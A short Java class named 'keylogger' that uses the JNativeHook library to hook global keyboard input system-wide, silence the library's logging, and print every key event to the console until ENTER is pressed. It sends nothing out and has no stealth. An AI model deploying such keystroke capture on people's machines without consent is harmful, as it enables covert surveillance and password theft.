package Client;

import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class keylogger implements NativeKeyListener {
	 public static void main(String[] args) {
//		// Clear previous logging configurations.
//		 LogManager.getLogManager().reset();
//
//		 // Get the logger for "org.jnativehook" and set the level to off.
		 Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		 logger.setLevel(Level.OFF);
	        try { 
	            GlobalScreen.registerNativeHook();
	            
	        } catch (NativeHookException ex) {
	            ex.printStackTrace();	              
	        }
	       GlobalScreen.addNativeKeyListener(new keylogger());
	    } 
	 


    /* Key Pressed */
    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));

        /* Terminate program when one press ESCAPE */
        if (e.getKeyCode() == NativeKeyEvent.VC_ENTER) {
            try {
				GlobalScreen.unregisterNativeHook();
			} catch (NativeHookException e1) {
			
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
        }
    }

    /* Key Released */
    public void nativeKeyReleased(NativeKeyEvent e) {
        System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    /* I can't find any output from this call */
    public void nativeKeyTyped(NativeKeyEvent e) {
        System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
    }

   
}